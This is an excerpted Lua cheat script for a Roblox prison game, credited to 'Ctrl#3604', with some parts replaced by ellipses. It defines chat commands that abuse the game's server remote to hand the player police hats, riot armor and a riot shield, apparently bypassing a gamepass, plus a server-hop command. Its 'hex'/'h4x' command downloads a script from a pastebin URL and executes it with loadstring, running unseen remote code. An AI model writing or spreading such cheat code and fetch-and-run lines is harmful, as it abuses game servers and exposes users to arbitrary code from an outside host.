...
Cmd[#Cmd + 1] = {Text = "script by Ctrl#3604",Title = "Script owner"}
...
Cmd[#Cmd + 1] =	{Text = "hat / hats / phat",Title = "Obtain the police hat"}
...
Cmd[#Cmd + 1] =	{Text = "shield / escudo",Title = "get the shield"}
...
Cmd[#Cmd + 1] = {Text = "hex / h4x",Title = "execute h4x script"}
...
Cmd[#Cmd + 1] =	{Text = "serverhop / hop",Title = "server hop"}
...
function PlayerChatted(Message)
	...
	if Command("hat") or Command ("Police hat") or Command("phat") then
		if BuyGamepass then
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.hats["Police hat"].hat)
		end
		Notify("hat Loaded", Color3.fromRGB(0, 255, 0), "Success")
			end
	if Command("armor") or Command("police Armor") then
		if BuyGamepass then
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.clothes["Riot Police"].ITEMPICKUP)
		end
		Notify("armor Loaded", Color3.fromRGB(0, 255, 0), "Success")
		end
	if Command("severhop") or Command ("hop") then
	...
	if Command("checkscriptowner") or Command("findowner") then
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.DisplayName == "Alt" and v.Name == "elalmigoxd" then
	...
	if Command("h4x") or Command("hex") then
		loadstring(game:HttpGet"https://pastebin.com/raw/QLtH2v8i")()
			Notify("xd", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("shield") or Command("escudo") then
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Riot Shield"].ITEMPICKUP)
	Notify("shield", Color3.fromRGB(0, 255, 0), "Success")
	end
